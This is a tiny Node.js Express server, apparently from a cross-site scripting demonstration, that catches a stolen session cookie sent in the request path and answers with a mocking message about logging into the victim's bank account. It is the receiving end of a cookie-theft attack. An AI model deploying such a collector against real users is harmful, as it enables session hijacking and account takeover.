let express = require('express')
 
let app = express()
 
 
app.get('/*', function(req, res) {
    let originalUrl = req.originalUrl.split("/")[1]
    res.send(`Thanks!  I'll go ahead and login to your bank account now with your session cookie: ${originalUrl}`)
})
  
app.listen(5000, function() {
    console.log("server running.....")
})